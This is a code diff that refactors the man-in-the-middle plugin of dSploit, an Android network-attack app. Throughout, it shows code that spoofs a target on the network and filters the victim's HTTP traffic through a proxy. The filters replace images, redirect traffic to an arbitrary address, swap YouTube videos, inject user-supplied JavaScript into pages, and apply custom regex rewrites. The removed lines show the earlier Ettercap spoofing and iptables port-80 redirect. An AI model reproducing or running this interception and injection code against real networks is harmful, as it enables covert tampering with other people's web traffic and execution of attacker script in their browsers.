@@ -53,8 +53,8 @@ import it.evilsocket.dsploit.gui.dialogs.InputDialog;
 import it.evilsocket.dsploit.gui.dialogs.InputDialog.InputDialogListener;
 import it.evilsocket.dsploit.net.Target;
 import it.evilsocket.dsploit.net.http.proxy.Proxy;
-import it.evilsocket.dsploit.net.http.server.Server;
-import it.evilsocket.dsploit.tools.Ettercap.OnReadyListener;
+import it.evilsocket.dsploit.net.http.proxy.Proxy.ProxyFilter;
+import it.evilsocket.dsploit.plugins.mitm.SpoofSession.OnSessionReadyListener;
 
 public class MITM extends Plugin 
 {
@@ -67,6 +67,7 @@ public class MITM extends Plugin
 	private ArrayList<Action> mActions  	   = new ArrayList<Action>();	
 	private Intent			  mImagePicker	   = null;
 	private ProgressBar       mCurrentActivity = null;
+	private SpoofSession	  mSpoofSession	   = null;
 	
 	static class Action
 	{
@@ -187,54 +188,47 @@ public class MITM extends Plugin
 		    		new ErrorDialog( "Error", "Could not determine file path.", MITM.this ).show();
 		    	}
 		    	else
-		    	{
+		    	{		    
+		    		mimeType 	  = System.getImageMimeType( fileName );		    		
+		    		mSpoofSession = new SpoofSession( true, true, fileName, mimeType );
+		    		
 		    		if( mCurrentActivity != null )
 		    			mCurrentActivity.setVisibility( View.VISIBLE );
-
-		    		mimeType = System.getImageMimeType( fileName );
-		    				
-		    		Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
 		    		
-		    		System.getServer().setResource( fileName, mimeType );
-		    		new Thread( System.getServer() ).start();
-		    		
-		    		final Proxy proxy = System.getProxy();
-		    		
-		    		System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
-		    			@Override
-		    			public void onReady() 
-		    			{
-		    				System.setForwarding( true );
-		    				
-		    				proxy.setFilter( new Proxy.ProxyFilter(){
+		    		mSpoofSession.start( new OnSessionReadyListener() {						
+						@Override
+						public void onSessionReady() {
+							MITM.this.runOnUiThread( new Runnable(){
 								@Override
-								public String onDataReceived( String headers, String data ) {
-									String resource = System.getServer().getResourceURL();
+								public void run() {									
+									System.getProxy().setFilter( new Proxy.ProxyFilter(){
+										@Override
+										public String onDataReceived( String headers, String data ) {
+											String resource = System.getServer().getResourceURL();
+											
+											// handle img tags
+											data = data.replaceAll
+											( 
+											  "(?i)<img([^/]+)src=['\"][^'\"]+['\"]", 
+											  "<img$1src=\"" + resource + "\"" 
+											);
+																		
+											// handle css background declarations
+											data = data.replaceAll
+											( 
+											  "(?i)background\\s*(:|-)\\s*url\\s*[\\(|:][^\\);]+\\)?.*", 
+											  "background: url(" + resource + ")" 
+											);
+
+											return data;
+										}
+									});
 									
-									// handle img tags
-									data = data.replaceAll
-									( 
-									  "(?i)<img([^/]+)src=['\"][^'\"]+['\"]", 
-									  "<img$1src=\"" + resource + "\"" 
-									);
-																
-									// handle css background declarations
-									data = data.replaceAll
-									( 
-									  "(?i)background\\s*(:|-)\\s*url\\s*[\\(|:][^\\);]+\\)?.*", 
-									  "background: url(" + resource + ")" 
-									);
-		
-									return data;
+									Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
 								}
 							});
-		    				
-		    				new Thread( proxy ).start();
-		    				
-		    				System.getIPTables().portRedirect( 80, System.HTTP_PROXY_PORT );									
-		    			}
-		    			
-		    		}).start();					    		
+						}
+					});			    		
 		    	}		    	
 	    	}
 	    	catch( Exception e )
@@ -265,24 +259,12 @@ public class MITM extends Plugin
 		{
 			Log.d( TAG, "Stopping current jobs ..." );
 						
-			System.setForwarding( false );
-			
-			System.getEttercap().kill();
-			System.getIPTables().undoPortRedirect( 80, System.HTTP_PROXY_PORT );
-			
-			Proxy  proxy  = System.getProxy();
-			Server server = System.getServer();
-			
-			if( proxy != null )
+			if( mSpoofSession != null )
 			{
-				proxy.stop();
-				proxy.setRedirection( null, 0 );
-				proxy.setFilter( null );
+				mSpoofSession.stop();
+				mSpoofSession = null;
 			}
-			
-			if( server != null )			
-				server.stop();
-			
+
 			for( i = 0; i < rows; i++ )
 			{
 				if( ( row = mActionListView.getChildAt( i ) ) != null )
@@ -434,25 +416,19 @@ public class MITM extends Plugin
 										throw new Exception();
 									
 									activity.setVisibility( View.VISIBLE );
-									
 									Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
 									
 									final String faddress = address;
 									final int	 fport	  = iport;
-									System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
+									
+									mSpoofSession = new SpoofSession();
+									
+									mSpoofSession.start( new OnSessionReadyListener() {										
 										@Override
-										public void onReady() {
-											Proxy proxy = System.getProxy();
-											
-											proxy.setRedirection( faddress, fport );
-											
-											System.setForwarding( true );
-																				
-											new Thread( proxy ).start();
-											
-											System.getIPTables().portRedirect( 80, System.HTTP_PROXY_PORT );										
+										public void onSessionReady() {
+											System.getProxy().setRedirection( faddress, fport );											
 										}
-									}).start();																			
+									});																	
 								}
 								catch( Exception e )
 								{
@@ -464,13 +440,8 @@ public class MITM extends Plugin
 						}
 					}).show();
 				}
-				else
-				{
-					setStoppedState();
-								
-					activity.setVisibility( View.INVISIBLE );
-				}
-				
+				else				
+					setStoppedState();				
 			}
 		}));
         
@@ -495,10 +466,7 @@ public class MITM extends Plugin
 				else
 				{			
 					mCurrentActivity = null;
-					
-					HTTPFilter.stop( System.getProxy() );
-
-					activity.setVisibility( View.INVISIBLE );
+					setStoppedState();
 				}
 			}
 		}));
@@ -534,19 +502,16 @@ public class MITM extends Plugin
 							if( video.isEmpty() == false && matcher != null && matcher.find() )
 							{
 								final String videoId = matcher.group( 1 );
-								final Proxy  proxy	 = System.getProxy();
 								
 								activity.setVisibility( View.VISIBLE );
 								
 								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
-												
-								System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
+								
+								mSpoofSession = new SpoofSession();
+								mSpoofSession.start( new OnSessionReadyListener() {									
 									@Override
-									public void onReady() 
-									{
-										System.setForwarding( true );
-										
-										proxy.setFilter( new Proxy.ProxyFilter() {					
+									public void onSessionReady() {
+										System.getProxy().setFilter( new Proxy.ProxyFilter() {					
 											@Override
 											public String onDataReceived( String headers, String data ) {												
 												if( data.matches( "(?s).+/v=[a-zA-Z0-9_-]+.+" ) )
@@ -560,14 +525,9 @@ public class MITM extends Plugin
 												
 												return data;
 											}
-										});
-										
-										new Thread( proxy ).start();
-										
-										System.getIPTables().portRedirect( 80, System.HTTP_PROXY_PORT );									
+										});								
 									}
-									
-								}).start();												
+								});											
 							}
 							else
 								new ErrorDialog( "Error", "Invalid youtube video.", MITM.this ).show();
@@ -575,11 +535,7 @@ public class MITM extends Plugin
 					).show();	
 				}
 				else
-				{					
-					HTTPFilter.stop( System.getProxy() );
-
-					activity.setVisibility( View.INVISIBLE );
-				}
+					setStoppedState();				
 			}
 		}));
 
@@ -616,8 +572,19 @@ public class MITM extends Plugin
 								activity.setVisibility( View.VISIBLE );
 								
 								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
-												
-								HTTPFilter.start( System.getProxy(), "(?i)</head>", js + "</head>" );								
+									
+								mSpoofSession = new SpoofSession();
+								mSpoofSession.start( new OnSessionReadyListener() {									
+									@Override
+									public void onSessionReady() {
+										System.getProxy().setFilter( new Proxy.ProxyFilter() {					
+											@Override
+											public String onDataReceived( String headers, String data ) {												
+												return data.replaceAll( "(?i)</head>", js + "</head>" );
+											}
+										});												
+									}
+								});
 							}
 							else
 								new ErrorDialog( "Error", "Invalid javascript code, remember to use <script></script> enclosing tags.", MITM.this ).show();
@@ -625,11 +592,7 @@ public class MITM extends Plugin
 					).show();	
 				}
 				else
-				{					
-					HTTPFilter.stop( System.getProxy() );
-
-					activity.setVisibility( View.INVISIBLE );
-				}
+					setStoppedState();
 			}
 		}));
     
@@ -644,7 +607,7 @@ public class MITM extends Plugin
 					
 					new CustomFilterDialog( "Custom Filter", MITM.this, new CustomFilterDialogListener(){
 						@Override
-						public void onInputEntered( ArrayList<String> from, ArrayList<String> to ) {
+						public void onInputEntered( final ArrayList<String> from, final ArrayList<String> to ) {
 							
 							if( from.isEmpty() == false && to.isEmpty() == false )
 							{
@@ -658,15 +621,29 @@ public class MITM extends Plugin
 									activity.setVisibility( View.VISIBLE );
 									
 									Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+										
+									mSpoofSession = new SpoofSession();
+									mSpoofSession.start( new OnSessionReadyListener() {										
+										@Override
+										public void onSessionReady() {
+											System.getProxy().setFilter( new ProxyFilter() {												
+												@Override
+												public String onDataReceived( String headers, String data ) {
+													for( int i = 0; i < from.size(); i++ )
+													{
+														data = data.replaceAll( from.get( i ), to.get( i ) );
+													}
 													
-									HTTPFilter.start( System.getProxy(), from, to );	
+													return data;
+												}
+											});
+										}
+									});									
 								} 
 								catch( PatternSyntaxException e ) 
 								{
 									new ErrorDialog( "Error", "Invalid regular expression: " + e.getDescription() + " .", MITM.this ).show();
-						        }	
-								
-								
+						        }																	
 							}
 							else
 								new ErrorDialog( "Error", "Invalid regular expression.", MITM.this ).show();
@@ -674,12 +651,7 @@ public class MITM extends Plugin
 					).show();
 				}
 				else
-				{
-					HTTPFilter.stop( System.getProxy() );
-
-					activity.setVisibility( View.INVISIBLE );
-
-				}
+					setStoppedState();
 			}
 		}));
         
